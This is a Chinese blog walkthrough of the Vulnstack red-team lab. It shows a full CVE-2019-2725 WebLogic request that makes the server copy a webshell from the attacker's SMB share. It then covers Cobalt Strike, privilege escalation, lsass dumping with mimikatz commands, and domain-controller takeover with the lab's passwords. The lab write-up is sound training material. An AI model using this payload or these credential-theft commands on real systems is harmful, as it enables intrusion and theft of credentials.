---
title: ATT&CK实战系列——红队实战(二)
author: Spade-Z
top: false
cover: false
toc: true
mathjax: false
summary: >-
  vlunstack是红日安全团队出品的一个实战环境，具体介绍请访问：http://vulnstack.qiyuanxuetang.net/vuln/detail/3/
tags:
  - 安全
  - 内网域渗透
  - 靶场
categories:
  - 渗透测试
abbrlink: 63e9fa60
date: 2021-03-31 14:01:58
img:
coverImg:
password:
---

# 一、环境搭建

## 1.1 靶场下载
---
靶场下载地址[传送门](http://vulnstack.qiyuanxuetang.net/vuln/detail/3/)
> 靶机通用密码：  1qaz@WSX

# 1.2 环境配置
---
拓扑图
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)1.png)
下载好靶机打开vmx文件z之后恢复到快照v1.3，由于DMZ网段为192.168.111.0/24，所以需要将子网ip设置为192.168.111.0
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)2.png)

## 1.3 配置信息
---
DC
IP：10.10.10.10OS：Windows 2012(64)
应用：AD域

WEB
IP1：10.10.10.80
IP2：192.168.111.80
OS：Windows 2008(64)
应用：Weblogic 10.3.6MSSQL 2008

PC
IP1：10.10.10.201
IP2：192.168.111.201
OS：Windows 7(32)
应用：

攻击机
IP： 192.168.111.1
OS： Windows 10(64)
IP： 192.168.111.128 
OS： Kali

>内网网段：10.10.10.1/24
>DMZ网段：192.168.111.1/24

## 1.4 域环境初始化
---
登录 WEB 主机启动服务。默认密码是 1qaz@WSX 需登录时修改。
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)3.png)
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)4.png)
输入新密码123.com
切换至 WEB 服务目录下启动 WEB 服务。
C:\Oracle\Middleware\user_projects\domains\base_domain
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)5.png)
双击运行
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)6.png)

# 二、weblogic 漏洞利用并 getshell

## 2.1	信息收集
---
全端口扫描
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)7.png)
常用端口是开放状态 1433 是 mssql， 7001 知道是 weblogic 服务，因为前面手工开启的。
使用WeblogicScan 工具扫一下
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)8.png)
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)9.png)

## 2.2	利用 CVE-2019-2725 获得 shell
---
Kali 搭建 smbserver 通过命令执行直接 copy 冰蝎马到服务器上。
启动 smbserver 名称为 share 目录为/root/
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)10.png)
打开 BurpSuite
将 POC 复制到 Repeater 中进行发包。
<pre style="background-color:#F0F8FF;">
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.111.80:7001
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
DNT: 1
Connection: close
Content-Type: text/xml
Content-Length: 839
&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;
&lt;soapenv:Header&gt;
&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;
&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;
&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
&lt;void class="java.lang.ProcessBuilder"&gt;
&lt;array class="java.lang.String" length="3"&gt;
&lt;void index="0"&gt;
&lt;string&gt;cmd&lt;/string&gt;
&lt;/void&gt;
&lt;void index="1"&gt;
&lt;string&gt;/c&lt;/string&gt;
&lt;/void&gt;
&lt;void index="2"&gt;
&lt;string&gt;copy \\192.168.111.128\share\shell.jsp servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\1.jsp &lt;/string&gt;
&lt;/void&gt;
&lt;/array&gt;
&lt;void method="start"/&gt;&lt;/void&gt;
&lt;/work:WorkContext&gt;
&lt;/soapenv:Header&gt;
&lt;soapenv:Body&gt;
&lt;asy:onAsyncDelivery/&gt;
&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;
</pre>
设置目标主机端口
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)11.png)
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)12.png)
使用冰蝎进行连接，地址：http://192.168.111.80:7001/_async/1.jsp
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)13.png)
查看用户信息
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)14.png)
查看系统信息，看一下系统安装了哪些补丁
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)15.png)

# 三、域渗透靶场获取DC权限

## 3.1	Cobalt Strike 部署
---
上传到kali中并解压
添加执行权限
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)16.png)
启动服务端(命令+ip+密码)
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)17.png)
启动客户端
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)18.png)
用户名随意填写， CS 支持多人协同工作，密码是 123456。

## 3.2	创建监听
---
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)19.png)
添加
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)20.png)
生成exe程序
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)21.png)
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)22.png)
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)23.png)

## 3.3  上传相关利用工具
---
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)24.png)

## 3.4	反弹管理员shell 给 cs 服务
---
先切换到我们上传文件的目录，运行 web.exe 返回一个 de1ay 用户的 shell。
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)25.png)
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)26.png)
提权
右键->Access->Elevate->ms14-058 提到 system 权限
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)27.png)
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)28.png)

## 3.5	明文读取密码
---
使用 管理员 权限 download 进程内
`beacon> shell procdump64.exe -accepteula -ma lsass.exe lsass.dmp`
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)29.png)
需要将 lsass.dmp 文件拖回本地放至相同的系统中进行解密。
`beacon> shell mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit >pass.txt`
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)30.png)
直接使用 download 命令下载，下载后会保存到程序目录的 downloads 目录。
`beacon> download pass.txt`
名字是随机字符串
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)32.png)

## 3.6	域信息收集
---
目前得到账户信息
mssql@de1ay 1qaz@WSX
de1ay@de1ay 1qaz@WSX
de1ay@WEB 该用户是登录系统用的，密码是登录时自行修改的。
查看网络信息找到域控
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)33.png)
DNS 服务器 10.10.10.10 也就是域控。
找到 DC 的主机名
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)34.png)
主机名： DC.de1ay.com

## 3.7	通过凭证连接域控反弹域控 shell
---
创建新的监听。
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)35.png)
选择 smb 这个特殊的 beacon，名称就叫 smb 这个后面要用。
恢复初始凭证
`beacon> rev2self` 
通过前面获取到的账户信息生成新的凭证。
`beacon> make_token DE1AY\de1ay 1qaz@WSX`
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)36.png)
DC上线
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)37.png)
![](https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&CK实战系列——红队实战(二)38.png)

>工具包[提取码：aj70](https://pan.baidu.com/s/1VdQW_AalGaZqT2LepNEnLw)